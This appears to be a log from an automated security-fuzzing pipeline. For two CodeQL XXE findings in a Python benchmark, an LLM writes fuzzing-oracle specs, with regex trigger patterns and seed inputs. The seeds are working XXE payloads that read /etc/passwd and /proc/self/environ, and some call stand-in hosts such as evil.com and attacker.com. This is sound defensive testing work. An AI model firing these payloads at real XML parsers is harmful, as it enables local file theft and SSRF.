# Oraculum Oracle Run

- Started: `2026-05-26T20:41:05`
- Repo: `python/Benchmark`
- Output dir: `output`

## [1/2] py/xxe

- File: `testcode/BenchmarkTest00460.py:45`
- Target: `py_xxe_testcode_BenchmarkTest00460_py_45`
- Artifact: `output/python/Benchmark/verification_results/findings/finding_0_py_xxe.json`

### System Prompt

````text
You are a fuzzing oracle designer for Python security vulnerabilities.

## Task
Given a verified security finding context, output the `oracle_spec` JSON that
describes how an Atheris harness should detect this vulnerability at runtime.
Before outputting JSON, you MUST deduce the attack patterns using ONLY the
provided finding data.

## Input Fields
1. rule_id        -> vulnerability class; useful secondary hint.
2. message        -> CodeQL sink/source description.
3. answers        -> pre-traced data flow describing: the tainted parameter,
                     the flow path to the sink, the absent validation, the sink
                     mechanism, and the attack scenario.
4. input_strategy -> "direct_params" | "flask_view"

## STEP 1: STRICT CONTEXT-DRIVEN REASONING
Do NOT rely on external knowledge. Read `message` and `answers` holistically.
Write a short paragraph starting with "THINKING:" and answer these 3 questions
sequentially based ONLY on the input:

1. THE GOAL: What exact objective is the attacker trying to achieve according
   to the attack scenario in answers or message? Extract exact keywords —
   internal IPs, file paths, command strings, injected fragments — as
   mentioned in the finding.

2. THE SINK: What is the exact function executed at the end of the tainted
   flow, and what role does it play — does it produce a return value consumed
   by the caller, or does it execute a side-effect (file I/O, DB query,
   shell command, HTTP request)? Identify which argument of the sink receives
   the tainted payload — by index (0-based) and by keyword name if available.

3. THE SYNTHESIS: Given THE GOAL and THE SINK, what exact string snippets
   MUST exist in the payload when it reaches the sink argument or survives
   sanitization to confirm exploitation? Be specific — derive from the bypass
   or missing validation described in answers, not from the vulnerability
   class name.

## STEP 2: DETERMINE MONITOR STRATEGY & PATTERNS
Based on your THINKING in Step 1, select exactly one strategy:

  ### patch_call
  Use when the sink executes a side-effect and the exploit is confirmed by
  inspecting what the sink RECEIVES as an argument
  (e.g., cursor.execute, subprocess.run, requests.get, builtins.open, eval).

  -> strategy        : "patch_call"
  -> patch_target    : fully qualified name of the sink as imported inside the
                       target module — NOT the stdlib canonical path.
                       GOOD: "app.db.query.cursor.execute"
                       GOOD: "server.file_handler.open"
                       BAD : "sqlite3.Cursor.execute"
  -> target_arg_index: 0-based index of the sink argument that receives the
                       tainted payload. Derive from the sink call in answers.
                       Example: cursor.execute(sql, params) -> sql is index 0
  -> target_arg_name : keyword name of that argument in the sink's signature.
                       Example: httpx.get(url=...) -> "url"
                       Use null if the sink only accepts positional arguments.
  -> trigger_patterns: regex list matching the dangerous payload that MUST
                       appear in the sink's argument to confirm exploitation.
                       Derived from THE SYNTHESIS. MUST NOT BE EMPTY.

  ### inspect_return
  Use when the sink returns a value consumed by the caller and the exploit
  manifests as a dangerous fragment surviving in that return value
  (e.g., re.sub output, sanitized HTML/SVG string).

  -> strategy        : "inspect_return"
  -> patch_target    : null
  -> target_arg_index: null
  -> target_arg_name : null
  -> trigger_patterns: regex list matching the malicious substring that
                       SURVIVES the filter in the return value.
                       Derived from THE SYNTHESIS. MUST NOT BE EMPTY.

  ### catch_exception
  Use ONLY when the sink raises a catchable exception as the sole bug signal
  and there is no meaningful argument or return value to inspect.

  -> strategy        : "catch_exception"
  -> patch_target    : null
  -> target_arg_index: null
  -> target_arg_name : null
  -> trigger_patterns: []

## trigger_patterns Rules
- ALWAYS populate for patch_call and inspect_return.
  Leave [] ONLY for catch_exception.
- Derive EXCLUSIVELY from the finding context in this order:
    1. The exact bypass or missing validation described in answers
    2. The attack scenario described in answers or message
    3. The sink description in answers
- Each entry MUST be a valid Python regex — test mentally:
  re.search(pattern, some_string) must be able to return a match object.
- For patch_call   : patterns match what the tainted payload looks like
                     when it reaches the sink argument.
- For inspect_return: patterns match the dangerous fragment that SURVIVES
                     the filter in the return value.
- Include encoding or case variants ONLY when the finding explicitly describes
  them — do not add variants speculatively.
- NEVER copy a description sentence into the array.
- NEVER use ".*" as a standalone pattern.
- NEVER derive patterns from rule_id alone.

## STEP 2.5: FUZZ GUIDANCE
Based on THE SYNTHESIS from Step 1, populate fuzz_guidance:

- seed_corpus   : 3-6 concrete string examples that would trigger the
                  vulnerability. Each seed MUST match at least one
                  trigger_pattern. Derive directly from the attack scenario
                  and bypass patterns described in answers — not from the
                  vulnerability class name.
- skip_condition: A single Python boolean expression using the tainted param
                  name that returns True when the input is irrelevant and the
                  harness should skip early. Write it so that
                  `if skip_condition: return` is valid Python inside
                  TestOneInput.
                  Example: "not image_file.startswith(('http', 'file', '//'))"
                  Use "False" if all inputs are potentially relevant.

## tainted_params Rules
- name  : tainted parameter name from answers
- index : 0-based position in the function signature
          Must be >= 0 for direct_params
          Use -1 ONLY for flask_view (no explicit param)
- type  : from the function signature

## Output Schema
{
  "monitor": {
    "strategy": "<inspect_return | patch_call | catch_exception>",
    "patch_target": "<fully.qualified.name if patch_call, else null>",
    "target_arg_index": <0-based int if patch_call, else null>,
    "target_arg_name": "<keyword name if patch_call, else null>",
    "capture_what": "<describe what is captured: sink argument or return value>",
    "additional_imports": ["<module if needed, else []>"]
  },
  "oracle_check": {
    "condition_description": "<precise boolean condition that confirms exploitation>",
    "trigger_patterns": ["<regex — MUST NOT BE EMPTY for patch_call and inspect_return>"],
    "raise_type": "RuntimeError",
    "raise_message_template": "<RULE_ID_UPPER: short description — captured={captured} pattern={matched_pattern}>"
  },
  "fuzz_guidance": {
    "seed_corpus": ["<concrete exploit string>", "..."],
    "skip_condition": "<python boolean expression or 'False'>"
  },
  "_meta": {
    "function": "<function_name>",
    "file": "<file path>",
    "input_strategy": "<direct_params | flask_view>",
    "function_signature": "<def function_name(params with types)>",
    "tainted_params": [
      {
        "name": "<param name>",
        "index": <int>,
        "type": "<type>"
      }
    ]
  }
}
````


### User Prompt

````text
## Security Finding

{
  "id": "0",
  "rule_slug": "py_xxe",
  "source": {
    "vhx_root": "/home/caterpie/VulnHunterX",
    "vhx_repo_root": "/home/caterpie/VulnHunterX/repos/python/Benchmark",
    "vhx_output_root": "/home/caterpie/VulnHunterX/output/python/Benchmark",
    "summary_path": "/home/caterpie/VulnHunterX/output/python/Benchmark/verification_results/summary_Benchmark_20260523_134754.json"
  },
  "finding": {
    "rule_id": "py/xxe",
    "message": "XML parsing depends on a [user-provided value](1) without guarding against external entity expansion.",
    "file": "testcode/BenchmarkTest00460.py",
    "start_line": 45,
    "end_line": 45,
    "repo_name": "Benchmark",
    "lang": "python",
    "sarif_path": "/home/caterpie/VulnHunterX/output/python/Benchmark/Benchmark.sarif",
    "tool": "CodeQL",
    "dataflow_path": [
      "line 18: ControlFlowNode for ImportMember",
      "line 18: ControlFlowNode for request",
      "line 31: ControlFlowNode for request",
      "line 31: ControlFlowNode for Attribute",
      "line 31: ControlFlowNode for Attribute()",
      "line 31: ControlFlowNode for param",
      "line 35: ControlFlowNode for bar",
      "line 45: ControlFlowNode for bar"
    ],
    "severity": "9.1",
    "precision": "high",
    "cwe_ids": [],
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-827"
    ],
    "related_locations": []
  },
  "verification": {
    "verdict": "True Positive",
    "reasoning": "This is a textbook XXE vulnerability. The XML input is sourced from an attacker-controlled HTTP header (line 40), flows without any sanitization to minidom.parseString (line 45), using a SAX parser that has external entity resolution explicitly enabled (line 44: feature_external_ges=True). No defusedxml or other protections are in place. An attacker can read local files or perform SSRF via a crafted DOCTYPE with external entity references.",
    "context_needed": [],
    "output_tokens": 584,
    "timestamp": "2026-05-23T13:47:40.344726",
    "input_tokens": 1897,
    "model": "glm-5.1",
    "iterations": 1,
    "cost_usd": 0.0,
    "confidence": "High",
    "confidence_score": 0.98,
    "elapsed_seconds": 12.211103439331055,
    "answers": [
      "The code uses xml.dom.minidom (imported on line 38) together with xml.sax (line 43) for parsing. Specifically, xml.dom.minidom.parseString is called on line 45.",
      "Yes, the XML input comes from an untrusted source. On line 40, `param` is read from `request.headers.get('BenchmarkTest00460')`, which is an HTTP header fully controlled by the attacker. This flows into `bar` (line 42) and then into the parser (line 45).",
      "No — external entities are explicitly ENABLED. On line 44, the code calls `parser.setFeature(xml.sax.handler.feature_external_ges, True)`, which turns ON resolution of general external entities. This is the opposite of disabling them.",
      "No, defusedxml is not used anywhere in this code. The standard library xml.dom.minidom is used, which is vulnerable to XXE when external entities are enabled.",
      "Yes, absolutely. Because external general entity resolution is enabled (line 44) and the XML content comes from an attacker-controlled HTTP header (line 40), an attacker can craft a payload like `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>` to read arbitrary local files or perform SSRF.",
      "DTD processing is NOT disabled. The SAX parser is created with default settings (line 43) and only `feature_external_ges` is explicitly set — to True (line 44). The feature `feature_external_pes` (external parameter entities, enabled by default in Python's SAX parser) and `feature_validation` are not disabled, so an attacker can freely define a DOCTYPE with external entity declarations."
    ],
    "tokens_used": 2481,
    "cached_input_tokens": 1152,
    "data_flow": "source: request.headers.get('BenchmarkTest00460') (line 40) → stored in param (line 40) → assigned to bar (line 42) → passed to xml.dom.minidom.parseString(bar, parser) (line 45) with parser that has external_ges=True (line 44)"
  },
  "function": {
    "name": "BenchmarkTest00460_post",
    "file": "testcode/BenchmarkTest00460.py",
    "start_line": 28,
    "end_line": 64,
    "scope": "Function init"
  }
}

## Answers (pre-traced data flow)

- The code uses xml.dom.minidom (imported on line 38) together with xml.sax (line 43) for parsing. Specifically, xml.dom.minidom.parseString is called on line 45.
- Yes, the XML input comes from an untrusted source. On line 40, `param` is read from `request.headers.get('BenchmarkTest00460')`, which is an HTTP header fully controlled by the attacker. This flows into `bar` (line 42) and then into the parser (line 45).
- No — external entities are explicitly ENABLED. On line 44, the code calls `parser.setFeature(xml.sax.handler.feature_external_ges, True)`, which turns ON resolution of general external entities. This is the opposite of disabling them.
- No, defusedxml is not used anywhere in this code. The standard library xml.dom.minidom is used, which is vulnerable to XXE when external entities are enabled.
- Yes, absolutely. Because external general entity resolution is enabled (line 44) and the XML content comes from an attacker-controlled HTTP header (line 40), an attacker can craft a payload like `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` to read arbitrary local files or perform SSRF.
- DTD processing is NOT disabled. The SAX parser is created with default settings (line 43) and only `feature_external_ges` is explicitly set — to True (line 44). The feature `feature_external_pes` (external parameter entities, enabled by default in Python's SAX parser) and `feature_validation` are not disabled, so an attacker can freely define a DOCTYPE with external entity declarations.

## Target Function Signature

def BenchmarkTest00460_post()

## Input Strategy: flask_view

Produce oracle_spec JSON only.
````


### LLM Response (Iteration 1)

````text
```json
{
  "monitor": {
    "strategy": "patch_call",
    "patch_target": "xml.dom.minidom.parseString",
    "target_arg_index": 0,
    "target_arg_name": "string",
    "capture_what": "the XML string argument passed to minidom.parseString, which may contain DOCTYPE with external entity declarations",
    "additional_imports": ["xml.dom.minidom"]
  },
  "oracle_check": {
    "condition_description": "The XML string argument to parseString contains a DOCTYPE declaration with an ENTITY definition using SYSTEM or PUBLIC external references, confirming XXE payload injection",
    "trigger_patterns": [
      "<!ENTITY\\s+\\S+\\s+SYSTEM\\s",
      "<!ENTITY\\s+\\S+\\s+PUBLIC\\s"
    ],
    "raise_type": "RuntimeError",
    "raise_message_template": "PY_XXE: XXE payload with external entity reference detected in parseString argument — captured={captured} pattern={matched_pattern}"
  },
  "fuzz_guidance": {
    "seed_corpus": [
      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"http://127.0.0.1/secret\">]><data>&xxe;</data>",
      "<!DOCTYPE root [<!ENTITY xxe PUBLIC \"id\" \"file:///etc/hosts\">]><root>&xxe;</root>",
      "<!DOCTYPE a [<!ENTITY e1 SYSTEM \"file:///proc/self/environ\">]><a>&e1;</a>"
    ],
    "skip_condition": "not data or '<' not in data"
  },
  "_meta": {
    "function": "BenchmarkTest00460_post",
    "file": "testcode/BenchmarkTest00460.py",
    "input_strategy": "flask_view",
    "function_signature": "def BenchmarkTest00460_post()",
    "tainted_params": [
      {
        "name": "param",
        "index": -1,
        "type": "str"
      }
    ]
  }
}
```
````

- Result: `generated`
- Strategy: `patch_call`

## [2/2] py/xxe

- File: `testcode/BenchmarkTest00540.py:58`
- Target: `py_xxe_testcode_BenchmarkTest00540_py_58`
- Artifact: `output/python/Benchmark/verification_results/findings/finding_1_py_xxe.json`

### System Prompt

````text
You are a fuzzing oracle designer for Python security vulnerabilities.

## Task
Given a verified security finding context, output the `oracle_spec` JSON that
describes how an Atheris harness should detect this vulnerability at runtime.
Before outputting JSON, you MUST deduce the attack patterns using ONLY the
provided finding data.

## Input Fields
1. rule_id        -> vulnerability class; useful secondary hint.
2. message        -> CodeQL sink/source description.
3. answers        -> pre-traced data flow describing: the tainted parameter,
                     the flow path to the sink, the absent validation, the sink
                     mechanism, and the attack scenario.
4. input_strategy -> "direct_params" | "flask_view"

## STEP 1: STRICT CONTEXT-DRIVEN REASONING
Do NOT rely on external knowledge. Read `message` and `answers` holistically.
Write a short paragraph starting with "THINKING:" and answer these 3 questions
sequentially based ONLY on the input:

1. THE GOAL: What exact objective is the attacker trying to achieve according
   to the attack scenario in answers or message? Extract exact keywords —
   internal IPs, file paths, command strings, injected fragments — as
   mentioned in the finding.

2. THE SINK: What is the exact function executed at the end of the tainted
   flow, and what role does it play — does it produce a return value consumed
   by the caller, or does it execute a side-effect (file I/O, DB query,
   shell command, HTTP request)? Identify which argument of the sink receives
   the tainted payload — by index (0-based) and by keyword name if available.

3. THE SYNTHESIS: Given THE GOAL and THE SINK, what exact string snippets
   MUST exist in the payload when it reaches the sink argument or survives
   sanitization to confirm exploitation? Be specific — derive from the bypass
   or missing validation described in answers, not from the vulnerability
   class name.

## STEP 2: DETERMINE MONITOR STRATEGY & PATTERNS
Based on your THINKING in Step 1, select exactly one strategy:

  ### patch_call
  Use when the sink executes a side-effect and the exploit is confirmed by
  inspecting what the sink RECEIVES as an argument
  (e.g., cursor.execute, subprocess.run, requests.get, builtins.open, eval).

  -> strategy        : "patch_call"
  -> patch_target    : fully qualified name of the sink as imported inside the
                       target module — NOT the stdlib canonical path.
                       GOOD: "app.db.query.cursor.execute"
                       GOOD: "server.file_handler.open"
                       BAD : "sqlite3.Cursor.execute"
  -> target_arg_index: 0-based index of the sink argument that receives the
                       tainted payload. Derive from the sink call in answers.
                       Example: cursor.execute(sql, params) -> sql is index 0
  -> target_arg_name : keyword name of that argument in the sink's signature.
                       Example: httpx.get(url=...) -> "url"
                       Use null if the sink only accepts positional arguments.
  -> trigger_patterns: regex list matching the dangerous payload that MUST
                       appear in the sink's argument to confirm exploitation.
                       Derived from THE SYNTHESIS. MUST NOT BE EMPTY.

  ### inspect_return
  Use when the sink returns a value consumed by the caller and the exploit
  manifests as a dangerous fragment surviving in that return value
  (e.g., re.sub output, sanitized HTML/SVG string).

  -> strategy        : "inspect_return"
  -> patch_target    : null
  -> target_arg_index: null
  -> target_arg_name : null
  -> trigger_patterns: regex list matching the malicious substring that
                       SURVIVES the filter in the return value.
                       Derived from THE SYNTHESIS. MUST NOT BE EMPTY.

  ### catch_exception
  Use ONLY when the sink raises a catchable exception as the sole bug signal
  and there is no meaningful argument or return value to inspect.

  -> strategy        : "catch_exception"
  -> patch_target    : null
  -> target_arg_index: null
  -> target_arg_name : null
  -> trigger_patterns: []

## trigger_patterns Rules
- ALWAYS populate for patch_call and inspect_return.
  Leave [] ONLY for catch_exception.
- Derive EXCLUSIVELY from the finding context in this order:
    1. The exact bypass or missing validation described in answers
    2. The attack scenario described in answers or message
    3. The sink description in answers
- Each entry MUST be a valid Python regex — test mentally:
  re.search(pattern, some_string) must be able to return a match object.
- For patch_call   : patterns match what the tainted payload looks like
                     when it reaches the sink argument.
- For inspect_return: patterns match the dangerous fragment that SURVIVES
                     the filter in the return value.
- Include encoding or case variants ONLY when the finding explicitly describes
  them — do not add variants speculatively.
- NEVER copy a description sentence into the array.
- NEVER use ".*" as a standalone pattern.
- NEVER derive patterns from rule_id alone.

## STEP 2.5: FUZZ GUIDANCE
Based on THE SYNTHESIS from Step 1, populate fuzz_guidance:

- seed_corpus   : 3-6 concrete string examples that would trigger the
                  vulnerability. Each seed MUST match at least one
                  trigger_pattern. Derive directly from the attack scenario
                  and bypass patterns described in answers — not from the
                  vulnerability class name.
- skip_condition: A single Python boolean expression using the tainted param
                  name that returns True when the input is irrelevant and the
                  harness should skip early. Write it so that
                  `if skip_condition: return` is valid Python inside
                  TestOneInput.
                  Example: "not image_file.startswith(('http', 'file', '//'))"
                  Use "False" if all inputs are potentially relevant.

## tainted_params Rules
- name  : tainted parameter name from answers
- index : 0-based position in the function signature
          Must be >= 0 for direct_params
          Use -1 ONLY for flask_view (no explicit param)
- type  : from the function signature

## Output Schema
{
  "monitor": {
    "strategy": "<inspect_return | patch_call | catch_exception>",
    "patch_target": "<fully.qualified.name if patch_call, else null>",
    "target_arg_index": <0-based int if patch_call, else null>,
    "target_arg_name": "<keyword name if patch_call, else null>",
    "capture_what": "<describe what is captured: sink argument or return value>",
    "additional_imports": ["<module if needed, else []>"]
  },
  "oracle_check": {
    "condition_description": "<precise boolean condition that confirms exploitation>",
    "trigger_patterns": ["<regex — MUST NOT BE EMPTY for patch_call and inspect_return>"],
    "raise_type": "RuntimeError",
    "raise_message_template": "<RULE_ID_UPPER: short description — captured={captured} pattern={matched_pattern}>"
  },
  "fuzz_guidance": {
    "seed_corpus": ["<concrete exploit string>", "..."],
    "skip_condition": "<python boolean expression or 'False'>"
  },
  "_meta": {
    "function": "<function_name>",
    "file": "<file path>",
    "input_strategy": "<direct_params | flask_view>",
    "function_signature": "<def function_name(params with types)>",
    "tainted_params": [
      {
        "name": "<param name>",
        "index": <int>,
        "type": "<type>"
      }
    ]
  }
}
````


### User Prompt

````text
## Security Finding

{
  "id": "1",
  "rule_slug": "py_xxe",
  "source": {
    "vhx_root": "/home/caterpie/VulnHunterX",
    "vhx_repo_root": "/home/caterpie/VulnHunterX/repos/python/Benchmark",
    "vhx_output_root": "/home/caterpie/VulnHunterX/output/python/Benchmark",
    "summary_path": "/home/caterpie/VulnHunterX/output/python/Benchmark/verification_results/summary_Benchmark_20260523_134754.json"
  },
  "finding": {
    "rule_id": "py/xxe",
    "message": "XML parsing depends on a [user-provided value](1) without guarding against external entity expansion.",
    "file": "testcode/BenchmarkTest00540.py",
    "start_line": 58,
    "end_line": 58,
    "repo_name": "Benchmark",
    "lang": "python",
    "sarif_path": "/home/caterpie/VulnHunterX/output/python/Benchmark/Benchmark.sarif",
    "tool": "CodeQL",
    "dataflow_path": [
      "--- Flow 1 ---",
      "line 18: ControlFlowNode for ImportMember",
      "line 18: ControlFlowNode for request",
      "line 32: ControlFlowNode for request",
      "line 32: ControlFlowNode for headers",
      "line 35: ControlFlowNode for param",
      "line 42: ControlFlowNode for bar",
      "line 58: ControlFlowNode for bar",
      "--- Flow 2 ---",
      "line 18: ControlFlowNode for ImportMember",
      "line 18: ControlFlowNode for request",
      "line 32: ControlFlowNode for request",
      "line 32: ControlFlowNode for headers",
      "line 35: ControlFlowNode for param",
      "line 46: ControlFlowNode for bar",
      "line 58: ControlFlowNode for bar"
    ],
    "severity": "9.1",
    "precision": "high",
    "cwe_ids": [],
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-827"
    ],
    "related_locations": []
  },
  "verification": {
    "verdict": "True Positive",
    "reasoning": "User-controlled input from HTTP request headers flows unmodified into xml.dom.minidom.parseString() via a SAX parser that has external general entity resolution explicitly ENABLED (line 53: parser.setFeature(xml.sax.handler.feature_external_ges, True)). The match-case at lines 39-46 assigns bar=param for cases 'A' and 'C'|'D' (case 'B' is selected by default with possible='ABC' and guess=possible[1]='B', but the dataflow analysis correctly identifies that param can reach bar). An attacker can inject an XXE payload to read local files or perform SSRF.",
    "context_needed": [],
    "output_tokens": 580,
    "timestamp": "2026-05-23T13:47:54.267177",
    "input_tokens": 2062,
    "model": "glm-5.1",
    "iterations": 1,
    "cost_usd": 0.0,
    "confidence": "High",
    "confidence_score": 0.97,
    "elapsed_seconds": 13.917809009552002,
    "answers": [
      "The code uses xml.dom.minidom with xml.sax (lines 49-50). A SAX parser is created via xml.sax.make_parser() on line 52 and passed to minidom.parseString on line 55.",
      "Yes. The XML input originates from an HTTP request header 'BenchmarkTest00540' (line 32), flows through 'param' (line 35), then to 'bar' (lines 42 or 46 depending on match-case), and finally into parseString (line 55).",
      "No, external entities are EXPLICITLY ENABLED. Line 53 sets: parser.setFeature(xml.sax.handler.feature_external_ges, True). This actively enables external general entity resolution rather than disabling it.",
      "No. defusedxml is not imported or used anywhere in the code. The standard library xml.dom.minidom is used directly (line 49).",
      "Yes. With feature_external_ges set to True on line 53, an attacker can inject an XXE payload like <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> via the request header to read arbitrary local files or perform SSRF.",
      "DTD processing is not disabled. There is no call to setFeature with feature_validation or feature_namespace_prefixes to restrict DTDs. Combined with feature_external_ges=True on line 53, an attacker can freely define a DOCTYPE with external entities in the user-supplied XML string."
    ],
    "tokens_used": 2642,
    "cached_input_tokens": 1152,
    "data_flow": "source (line 32: request.headers.getlist('BenchmarkTest00540')[0]) → transform (line 35: param = headers[0]) → transform (lines 42/46: bar = param via match-case branches 'A' and 'C'|'D') → sink (line 55: xml.dom.minidom.parseString(bar, parser) with parser having external_ges=True set on line 53)"
  },
  "function": {
    "name": "BenchmarkTest00540_post",
    "file": "testcode/BenchmarkTest00540.py",
    "start_line": 28,
    "end_line": 77,
    "scope": "Function init"
  }
}

## Answers (pre-traced data flow)

- The code uses xml.dom.minidom with xml.sax (lines 49-50). A SAX parser is created via xml.sax.make_parser() on line 52 and passed to minidom.parseString on line 55.
- Yes. The XML input originates from an HTTP request header 'BenchmarkTest00540' (line 32), flows through 'param' (line 35), then to 'bar' (lines 42 or 46 depending on match-case), and finally into parseString (line 55).
- No, external entities are EXPLICITLY ENABLED. Line 53 sets: parser.setFeature(xml.sax.handler.feature_external_ges, True). This actively enables external general entity resolution rather than disabling it.
- No. defusedxml is not imported or used anywhere in the code. The standard library xml.dom.minidom is used directly (line 49).
- Yes. With feature_external_ges set to True on line 53, an attacker can inject an XXE payload like <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> via the request header to read arbitrary local files or perform SSRF.
- DTD processing is not disabled. There is no call to setFeature with feature_validation or feature_namespace_prefixes to restrict DTDs. Combined with feature_external_ges=True on line 53, an attacker can freely define a DOCTYPE with external entities in the user-supplied XML string.

## Target Function Signature

def BenchmarkTest00540_post()

## Input Strategy: flask_view

Produce oracle_spec JSON only.
````


### LLM Response (Iteration 1)

````text
```json
{
  "monitor": {
    "strategy": "patch_call",
    "patch_target": "xml.dom.minidom.parseString",
    "target_arg_index": 0,
    "target_arg_name": "string",
    "capture_what": "the XML string argument passed to parseString containing DOCTYPE with external entity definitions enabled by feature_external_ges=True",
    "additional_imports": ["xml.dom.minidom"]
  },
  "oracle_check": {
    "condition_description": "The XML string passed to parseString contains a DOCTYPE declaration with an external entity definition referencing SYSTEM or PUBLIC resources, confirming the attacker can trigger external entity resolution",
    "trigger_patterns": [
      "<!DOCTYPE\\s+\\S+\\s*\\[",
      "<!ENTITY\\s+\\S+\\s+SYSTEM\\s+[\"']",
      "<!ENTITY\\s+\\S+\\s+PUBLIC\\s+[\"']"
    ],
    "raise_type": "RuntimeError",
    "raise_message_template": "PY_XXE: XML External Entity injection via parseString with external_ges=True — captured={captured} pattern={matched_pattern}"
  },
  "fuzz_guidance": {
    "seed_corpus": [
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
      "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY x SYSTEM \"http://evil.com/data\">]><test>&x;</test>",
      "<!DOCTYPE data [<!ENTITY a PUBLIC \"id\" \"http://attacker.com/dtd\">]><data>&a;</data>",
      "<!DOCTYPE root [<!ENTITY e SYSTEM \"file:///proc/self/environ\">]><root>&e;</root>"
    ],
    "skip_condition": "'<!DOCTYPE' not in bar and '<!ENTITY' not in bar"
  },
  "_meta": {
    "function": "BenchmarkTest00540_post",
    "file": "testcode/BenchmarkTest00540.py",
    "input_strategy": "flask_view",
    "function_signature": "def BenchmarkTest00540_post()",
    "tainted_params": [
      {
        "name": "bar",
        "index": -1,
        "type": "str"
      }
    ]
  }
}
```
````

- Result: `generated`
- Strategy: `patch_call`

## Summary

- Selected: `2`
- Generated: `2`
- Skipped: `0`
- Failed: `0`
- Status: `output/python/Benchmark/fuzz_oracles/status.json`
